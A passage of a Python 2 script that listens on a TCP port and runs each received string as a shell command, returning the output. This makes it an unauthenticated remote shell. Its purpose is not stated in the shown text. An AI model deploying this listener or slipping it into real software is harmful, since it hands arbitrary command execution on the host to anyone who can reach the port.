s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(("", port))\ns.listen(5)\nprint "OK."\nprint "  Listening on port:", port\nimport subprocess\n\nwhile True:\n    con, addr = s.accept()\n    while True:\n        datagram = con.recv(1024)\n        if not datagram:\n            break\n        print("Rx Cmd:", datagram)\n        print("Launch:", datagram)\n        process = subprocess.Popen(datagram + " &", shell=True, stdout=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n        \n        # Send the output followed by a custom delimiter\n        response = stdout + 'END_OF_OUTPUT\n'\n        con.send(response)\n    con.close()\n\ns.close()